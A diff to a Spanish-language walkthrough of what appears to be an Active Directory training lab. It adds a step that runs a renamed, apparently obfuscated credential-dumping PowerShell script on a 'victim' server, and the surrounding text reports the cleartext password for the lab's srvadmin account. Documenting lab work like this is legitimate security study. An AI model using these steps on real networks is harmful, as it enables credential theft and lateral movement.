@@ -307,6 +307,11 @@ Lo volvemos a copiar en la maquina victima y lo ejecutamos
 Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
+Lo ejecutatremos
+```shell
+.\Invoke-TheKatEx-vault-std97.ps1
+```
+
 Obteniendo como respuesta la contraseña en texto claro del usuario *srvadmin::TheKeyUs3ron@anyMachine!*
 
 Ahora nos ejecutaremos una shell como este usuario
